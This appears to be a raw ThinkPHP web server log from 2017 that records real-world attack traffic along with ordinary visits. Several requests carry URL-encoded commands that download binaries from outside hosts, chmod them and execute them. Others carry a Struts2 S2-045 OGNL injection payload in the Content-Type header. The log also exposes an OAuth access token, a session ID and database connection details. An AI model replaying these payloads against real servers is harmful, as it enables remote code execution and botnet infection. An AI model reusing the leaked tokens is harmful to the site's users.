  'referer' => 'http://101.37.28.32:80/index.action/shell?%77%67%65%74%20%2D%50%20%2F%74%6D%70%20%68%74%74%70%3A%2F%2F%36%31%2E%31%36%30%2E%32%31%31%2E%32%30%30%3A%31%32%34%35%39%2F%68%61%63%6B%71%7A',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'host' => '101.37.28.32',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'wget_-P_/tmp_http://61_160_211_200:12459/hackqz' => '',
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T03:56:15+08:00 ] 101.37.28.32 58.63.210.14 GET /index.action/shell?%77%67%65%74%20%2D%50%20%2F%74%6D%70%20%68%74%74%70%3A%2F%2F%68%66%73%2E%6D%68%61%63%6B%65%72%2E%63%63%3A%39%32%37%38%2F%6C%69%6E%75%78%2E%61%72%6D%3B%63%68%6D%6F%64%20%37%37%37%20%2F%74%6D%70%2F%6C%69%6E%75%78%2E%61%72%6D%3B%2F%74%6D%70%2F%6C%69%6E%75%78%2E%61%72%6D
[ log ] 101.37.28.32/index.action/shell?%77%67%65%74%20%2D%50%20%2F%74%6D%70%20%68%74%74%70%3A%2F%2F%68%66%73%2E%6D%68%61%63%6B%65%72%2E%63%63%3A%39%32%37%38%2F%6C%69%6E%75%78%2E%61%72%6D%3B%63%68%6D%6F%64%20%37%37%37%20%2F%74%6D%70%2F%6C%69%6E%75%78%2E%61%72%6D%3B%2F%74%6D%70%2F%6C%69%6E%75%78%2E%61%72%6D [运行时间：0.003593s][吞吐率：278.32req/s] [内存消耗：622.41kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index.action',
    1 => 'shell',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'content-type' => 'application/x-www-form-urlencoded',
  'accept' => '*/*',
  'accept-language' => 'zh-cn',
  'referer' => 'http://101.37.28.32:80/index.action/shell?%77%67%65%74%20%2D%50%20%2F%74%6D%70%20%68%74%74%70%3A%2F%2F%68%66%73%2E%6D%68%61%63%6B%65%72%2E%63%63%3A%39%32%37%38%2F%6C%69%6E%75%78%2E%61%72%6D%3B%63%68%6D%6F%64%20%37%37%37%20%2F%74%6D%70%2F%6C%69%6E%75%78%2E%61%72%6D%3B%2F%74%6D%70%2F%6C%69%6E%75%78%2E%61%72%6D',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'host' => '101.37.28.32',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'wget_-P_/tmp_http://hfs_mhacker_cc:9278/linux_arm;chmod_777_/tmp/linux_arm;/tmp/linux_arm' => '',
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T03:56:15+08:00 ] 101.37.28.32 58.63.210.14 GET /index.action/shell?%63%68%6D%6F%64%20%37%37%37%20%2F%74%6D%70%2F%68%61%63%6B%71%7A%3B%2F%74%6D%70%2F%68%61%63%6B%71%7A
[ log ] 101.37.28.32/index.action/shell?%63%68%6D%6F%64%20%37%37%37%20%2F%74%6D%70%2F%68%61%63%6B%71%7A%3B%2F%74%6D%70%2F%68%61%63%6B%71%7A [运行时间：0.003499s][吞吐率：285.81req/s] [内存消耗：621.84kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index.action',
    1 => 'shell',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'content-type' => 'application/x-www-form-urlencoded',
  'accept' => '*/*',
  'accept-language' => 'zh-cn',
  'referer' => 'http://101.37.28.32:80/index.action/shell?%63%68%6D%6F%64%20%37%37%37%20%2F%74%6D%70%2F%68%61%63%6B%71%7A%3B%2F%74%6D%70%2F%68%61%63%6B%71%7A',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'host' => '101.37.28.32',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'chmod_777_/tmp/hackqz;/tmp/hackqz' => '',
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T03:56:15+08:00 ] 101.37.28.32 58.63.210.14 GET /index.action/shell?%77%67%65%74%20%2D%50%20%2F%74%6D%70%20%68%74%74%70%3A%2F%2F%61%72%6D%2E%74%66%31%32%33%2E%63%6C%75%62%3A%31%32%33%34%2F%74%66%61%72%3B%63%68%6D%6F%64%20%37%37%37%20%2F%74%6D%70%2F%74%66%61%72%3B%2F%74%6D%70%2F%74%66%61%72
[ log ] 101.37.28.32/index.action/shell?%77%67%65%74%20%2D%50%20%2F%74%6D%70%20%68%74%74%70%3A%2F%2F%61%72%6D%2E%74%66%31%32%33%2E%63%6C%75%62%3A%31%32%33%34%2F%74%66%61%72%3B%63%68%6D%6F%64%20%37%37%37%20%2F%74%6D%70%2F%74%66%61%72%3B%2F%74%6D%70%2F%74%66%61%72 [运行时间：0.003507s][吞吐率：285.15req/s] [内存消耗：622.22kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index.action',
    1 => 'shell',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'content-type' => 'application/x-www-form-urlencoded',
  'accept' => '*/*',
  'accept-language' => 'zh-cn',
  'referer' => 'http://101.37.28.32:80/index.action/shell?%77%67%65%74%20%2D%50%20%2F%74%6D%70%20%68%74%74%70%3A%2F%2F%61%72%6D%2E%74%66%31%32%33%2E%63%6C%75%62%3A%31%32%33%34%2F%74%66%61%72%3B%63%68%6D%6F%64%20%37%37%37%20%2F%74%6D%70%2F%74%66%61%72%3B%2F%74%6D%70%2F%74%66%61%72',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'host' => '101.37.28.32',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'wget_-P_/tmp_http://arm_tf123_club:1234/tfar;chmod_777_/tmp/tfar;/tmp/tfar' => '',
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T07:00:20+08:00 ] 101.37.28.32 119.23.140.203 GET /
[ log ] 61.54.47.216:80/ [运行时间：0.002698s][吞吐率：370.65req/s] [内存消耗：650.27kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '61.54.47.216:80',
  'connection' => 'Close',
  'accept-encoding' => 'identity',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T07:47:37+08:00 ] 101.37.28.32 80.82.78.38 GET /cache/global/img/gs.gif
[ log ] www.baidu.com/cache/global/img/gs.gif [运行时间：0.003758s][吞吐率：266.10req/s] [内存消耗：619.54kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'cache',
    1 => 'global',
    2 => 'img',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.baidu.com',
  'user-agent' => 'Mozilla',
  'if-modified-since' => 'Thu, 19 Apr 2012 09:51:20 GMT',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T07:55:41+08:00 ] 101.37.28.32 222.186.34.77 GET /
[ log ] 101.37.28.32/ [运行时间：0.004728s][吞吐率：211.50req/s] [内存消耗：651.09kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'content-type' => '%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#wmres=#context[\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\']).(#wmres.getWriter().print("S2-045 dir--***")).(#wmreq=#context.get(\'com.opensymphony.xwork2.dispatcher.HttpServletRequest\')).(#wmres.getWriter().println(#wmreq.getSession().getServletContext().getRealPath("/"))).(#wmres.getWriter().flush()).(#wmres.getWriter().close())}.multipart/form-data',
  'accept' => '*/*',
  'accept-language' => 'zh-cn',
  'referer' => 'http://101.37.28.32',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'host' => '101.37.28.32',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T07:56:03+08:00 ] 101.37.28.32 222.186.34.77 GET /
[ log ] 101.37.28.32/ [运行时间：0.004689s][吞吐率：213.27req/s] [内存消耗：651.09kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'content-type' => '%{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#wmres=#context[\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\']).(#wmres.getWriter().print("S2-045 dir--***")).(#wmreq=#context.get(\'com.opensymphony.xwork2.dispatcher.HttpServletRequest\')).(#wmres.getWriter().println(#wmreq.getSession().getServletContext().getRealPath("/"))).(#wmres.getWriter().flush()).(#wmres.getWriter().close())}.multipart/form-data',
  'accept' => '*/*',
  'accept-language' => 'zh-cn',
  'referer' => 'http://101.37.28.32',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'host' => '101.37.28.32',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T08:13:32+08:00 ] 101.37.28.32 42.156.251.188 GET /
[ log ] 101.37.28.32/ [运行时间：0.002698s][吞吐率：370.65req/s] [内存消耗：650.77kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'spiderman',
  'accept-language' => 'en-us,en-gb,en;q=0.7,*;q=0.3',
  'accept-charset' => 'utf-8,ISO-8859-1;q=0.7,*;q=0.7',
  'accept' => 'text/html,application/xml;q=0.9,application/xhtml+xml,text/xml;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
  'accept-encoding' => 'x-gzip, gzip, deflate',
  'host' => '101.37.28.32',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T08:13:53+08:00 ] 101.37.28.32 42.156.251.188 GET /
[ log ] 101.37.28.32/ [运行时间：0.002663s][吞吐率：375.50req/s] [内存消耗：650.77kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'spiderman',
  'accept-language' => 'en-us,en-gb,en;q=0.7,*;q=0.3',
  'accept-charset' => 'utf-8,ISO-8859-1;q=0.7,*;q=0.7',
  'accept' => 'text/html,application/xml;q=0.9,application/xhtml+xml,text/xml;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
  'accept-encoding' => 'x-gzip, gzip, deflate',
  'host' => '101.37.28.32',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T09:37:40+08:00 ] 101.37.28.32 221.122.36.85 GET /?unionid=oXMGUjgD5Qpcpy6uBacf3Wtipxg0&access_token=3uwub9e-E4UOaST3iAF1qoSRUEcDPWceqUPIQ7dk_hku7-P9YlGiC1aLjWNd8Psqml-Kb1cBep7sNDboMQ4uU_5m4tBvbPnuaYX2jZDuOng&source=oauth
[ log ] oil.chetuobang.com/?unionid=oXMGUjgD5Qpcpy6uBacf3Wtipxg0&access_token=3uwub9e-E4UOaST3iAF1qoSRUEcDPWceqUPIQ7dk_hku7-P9YlGiC1aLjWNd8Psqml-Kb1cBep7sNDboMQ4uU_5m4tBvbPnuaYX2jZDuOng&source=oauth [运行时间：0.021123s][吞吐率：47.34req/s] [内存消耗：1,008.48kb] [文件加载：51]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'oil.chetuobang.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip, deflate, sdch',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'unionid' => 'oXMGUjgD5Qpcpy6uBacf3Wtipxg0',
  'access_token' => '3uwub9e-E4UOaST3iAF1qoSRUEcDPWceqUPIQ7dk_hku7-P9YlGiC1aLjWNd8Psqml-Kb1cBep7sNDboMQ4uU_5m4tBvbPnuaYX2jZDuOng',
  'source' => 'oauth',
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ DB ] INIT mysql
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /web/public/../application/index/view/index/index.html [ array (
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.002944s ] mysql:dbname=ctb-test;host=118.178.128.23;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `ctb_user` [ RunTime:0.002348s ]
[ sql ] [ SQL ] SELECT * FROM `ctb_user` WHERE  `u_union_id` = 'oJc0Xvzg0ammlRv-gispbVGsWHps' LIMIT 1    [ RunTime:0.002001s ]

---------------------------------------------------------------
[ 2017-04-06T09:37:47+08:00 ] 101.37.28.32 221.122.36.85 GET /
[ log ] oil.chetuobang.com/ [运行时间：0.004761s][吞吐率：210.04req/s] [内存消耗：651.16kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'oil.chetuobang.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'accept-encoding' => 'gzip, deflate, sdch',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => 'u_id=9',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T09:37:59+08:00 ] 101.37.28.32 221.122.36.85 GET /oilcard/index/index?type=1
[ log ] oil.chetuobang.com/oilcard/index/index?type=1 [运行时间：0.010746s][吞吐率：93.06req/s] [内存消耗：863.10kb] [文件加载：48]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'oilcard',
    1 => 'index',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'oil.chetuobang.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'referer' => 'http://oil.chetuobang.com/?unionid=oXMGUjgD5Qpcpy6uBacf3Wtipxg0&access_token=3uwub9e-E4UOaST3iAF1qoSRUEcDPWceqUPIQ7dk_hku7-P9YlGiC1aLjWNd8Psqml-Kb1cBep7sNDboMQ4uU_5m4tBvbPnuaYX2jZDuOng&source=oauth',
  'accept-encoding' => 'gzip, deflate, sdch',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => 'u_id=9',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'type' => '1',
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/oilcard/controller/Index.php 17 - 28
}

[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /web/public/../application/oilcard/view/index/recharge.html [ array (
  0 => 'info',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.002644s ] mysql:dbname=ctb-test;host=118.178.128.23;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `sinopec_card` [ RunTime:0.002171s ]
[ sql ] [ SQL ] SELECT * FROM `sinopec_card` WHERE  `u_id` = 8 LIMIT 1    [ RunTime:0.001766s ]

---------------------------------------------------------------
[ 2017-04-06T09:49:18+08:00 ] 101.37.28.32 221.122.36.85 GET /oilcard/index/index?type=1
[ log ] oil.chetuobang.com/oilcard/index/index?type=1 [运行时间：0.012874s][吞吐率：77.68req/s] [内存消耗：862.88kb] [文件加载：48]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'oilcard',
    1 => 'index',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'oil.chetuobang.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'referer' => 'http://oil.chetuobang.com/?unionid=oXMGUjgD5Qpcpy6uBacf3Wtipxg0&access_token=3uwub9e-E4UOaST3iAF1qoSRUEcDPWceqUPIQ7dk_hku7-P9YlGiC1aLjWNd8Psqml-Kb1cBep7sNDboMQ4uU_5m4tBvbPnuaYX2jZDuOng&source=oauth',
  'accept-encoding' => 'gzip, deflate, sdch',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => 'u_id=9; PHPSESSID=7tcgl7ula7q3hdr5h2h934vkc4',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'type' => '1',
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/oilcard/controller/Index.php 17 - 28
}

[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /web/public/../application/oilcard/view/index/recharge.html [ array (
  0 => 'info',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.003528s ] mysql:dbname=ctb-test;host=118.178.128.23;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `sinopec_card` [ RunTime:0.002798s ]
[ sql ] [ SQL ] SELECT * FROM `sinopec_card` WHERE  `u_id` = 8 LIMIT 1    [ RunTime:0.002326s ]

---------------------------------------------------------------
[ 2017-04-06T10:18:44+08:00 ] 101.37.28.32 139.162.124.167 GET /
[ log ] 101.37.28.32/ [运行时间：0.002669s][吞吐率：374.66req/s] [内存消耗：650.35kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '101.37.28.32',
  'user-agent' => 'Mozilla/5.0',
  'accept-encoding' => 'gzip',
  'connection' => 'close',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T10:20:54+08:00 ] 101.37.28.32 221.122.36.85 GET /member/index/index
[ log ] oil.chetuobang.com/member/index/index [运行时间：0.012890s][吞吐率：77.58req/s] [内存消耗：866.33kb] [文件加载：48]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'member',
    1 => 'index',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'oil.chetuobang.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'referer' => 'http://oil.chetuobang.com/?unionid=oXMGUjgD5Qpcpy6uBacf3Wtipxg0&access_token=3uwub9e-E4UOaST3iAF1qoSRUEcDPWceqUPIQ7dk_hku7-P9YlGiC1aLjWNd8Psqml-Kb1cBep7sNDboMQ4uU_5m4tBvbPnuaYX2jZDuOng&source=oauth',
  'accept-encoding' => 'gzip, deflate, sdch',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => 'u_id=9; PHPSESSID=7tcgl7ula7q3hdr5h2h934vkc4',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/member/controller/Index.php 39 - 44
}

[ info ] [ VIEW ] /web/public/../application/member/view/index/index.html [ array (
  0 => 'info',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.003572s ] mysql:dbname=ctb-test;host=118.178.128.23;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `ctb_user` [ RunTime:0.002663s ]
[ sql ] [ SQL ] SELECT * FROM `ctb_user` WHERE  `u_id` = 9 LIMIT 1    [ RunTime:0.002470s ]

---------------------------------------------------------------
[ 2017-04-06T10:20:56+08:00 ] 101.37.28.32 221.122.36.85 GET /member/index/account
[ log ] oil.chetuobang.com/member/index/account [运行时间：0.010863s][吞吐率：92.06req/s] [内存消耗：866.20kb] [文件加载：48]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'member',
    1 => 'index',
    2 => 'account',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'oil.chetuobang.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'referer' => 'http://oil.chetuobang.com/member/index/index',
  'accept-encoding' => 'gzip, deflate, sdch',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => 'u_id=9; PHPSESSID=7tcgl7ula7q3hdr5h2h934vkc4',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] Method [ <user> public method account ] {
  @@ /web/application/member/controller/Index.php 46 - 51
}

[ info ] [ VIEW ] /web/public/../application/member/view/index/account.html [ array (
  0 => 'info',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.002903s ] mysql:dbname=ctb-test;host=118.178.128.23;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `ctb_user` [ RunTime:0.002156s ]
[ sql ] [ SQL ] SELECT * FROM `ctb_user` WHERE  `u_id` = 9 LIMIT 1    [ RunTime:0.001762s ]

---------------------------------------------------------------
[ 2017-04-06T10:48:21+08:00 ] 101.37.28.32 116.62.176.205 GET /
[ log ] 59.110.66.236:80/ [运行时间：0.002702s][吞吐率：370.10req/s] [内存消耗：650.24kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '59.110.66.236:80',
  'connection' => 'Close',
  'accept-encoding' => 'identity',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T12:10:12+08:00 ] 101.37.28.32 42.156.251.187 GET /
[ log ] 101.37.28.32/ [运行时间：0.002717s][吞吐率：368.05req/s] [内存消耗：650.77kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'spiderman',
  'accept-language' => 'en-us,en-gb,en;q=0.7,*;q=0.3',
  'accept-charset' => 'utf-8,ISO-8859-1;q=0.7,*;q=0.7',
  'accept' => 'text/html,application/xml;q=0.9,application/xhtml+xml,text/xml;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
  'accept-encoding' => 'x-gzip, gzip, deflate',
  'host' => '101.37.28.32',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T12:10:33+08:00 ] 101.37.28.32 42.156.251.187 GET /
[ log ] 101.37.28.32/ [运行时间：0.002671s][吞吐率：374.39req/s] [内存消耗：650.77kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'spiderman',
  'accept-language' => 'en-us,en-gb,en;q=0.7,*;q=0.3',
  'accept-charset' => 'utf-8,ISO-8859-1;q=0.7,*;q=0.7',
  'accept' => 'text/html,application/xml;q=0.9,application/xhtml+xml,text/xml;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
  'accept-encoding' => 'x-gzip, gzip, deflate',
  'host' => '101.37.28.32',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] Method [ <user> public method index ] {
  @@ /web/application/index/controller/Index.php 10 - 52
}

[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T12:28:42+08:00 ] 101.37.28.32 140.205.225.187 POST /bonirulfhsxk
[ log ] 101.37.28.32:80/bonirulfhsxk [运行时间：0.003703s][吞吐率：270.06req/s] [内存消耗：620.61kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'bonirulfhsxk',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'content-length' => '22',
  'host' => '101.37.28.32:80',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'close',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812.elasticsearch_unauthorized)',
)
[ info ] [ PARAM ] array (
  '{"aliyun":_"vulntest"}' => '',
)
[ info ] [ LANG ] /web/thinkphp/lang/zh-cn.php
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-04-06T12:28:42+08:00 ] 101.37.28.32 140.205.225.187 GET /bonirulfhsxk
[ log ] 101.37.28.32:80/bonirulfhsxk [运行时间：0.003370s][吞吐率：296.73req/s] [内存消耗：619.71kb] [文件加载：38]
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'bonirulfhsxk',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'host' => '101.37.28.32:80',
  'connection' => 'close',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.5448812.elasticsearch_unauthorized)',
  'content-type' => '',
